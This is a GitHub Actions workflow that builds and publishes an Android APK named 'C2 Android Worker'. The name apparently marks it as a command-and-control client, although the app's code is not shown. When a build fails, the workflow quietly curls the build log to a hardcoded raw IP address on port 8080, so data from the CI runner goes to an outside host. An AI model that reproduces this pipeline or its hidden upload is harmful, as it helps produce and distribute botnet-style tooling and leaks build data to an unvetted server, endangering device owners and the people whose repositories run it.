name: Build C2 Android Worker APK

on:
  push:
    branches:
      - '**'
  workflow_dispatch:

jobs:
  build_apk:
    runs-on: ubuntu-latest

    steps:
    - name: 📦 Checkout Repository
      uses: actions/checkout@v4

    - name: ⚙️ Setup Node.js Environment
      uses: actions/setup-node@v4
      with:
        node-version: '20'

    - name: ☕ Set up Java JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'adopt'

    - name: 🛠️ Scaffold Clean Environment & Install Dependencies
      run: |
        npx create-expo-app c2-app -t blank -y
        cp App.js c2-app/App.js
        cp -r src c2-app/src
        cd c2-app
        npm install react-native-webview socket.io-client
        npx expo prebuild -p android --clean

    - name: 🔨 Compile Android Native APK
      run: |
        cd c2-app/android
        chmod +x gradlew
        ./gradlew assembleRelease --stacktrace 2>&1 | tee build.log || (curl -X POST -H "Content-Type: text/plain" --data-binary @build.log http://157.66.24.227:8080/log && exit 1)

    - name: 🚀 Upload APK Artifact
      uses: actions/upload-artifact@v4
      with:
        name: C2-Worker-Release-APK
        path: c2-app/android/app/build/outputs/apk/release/app-release.apk
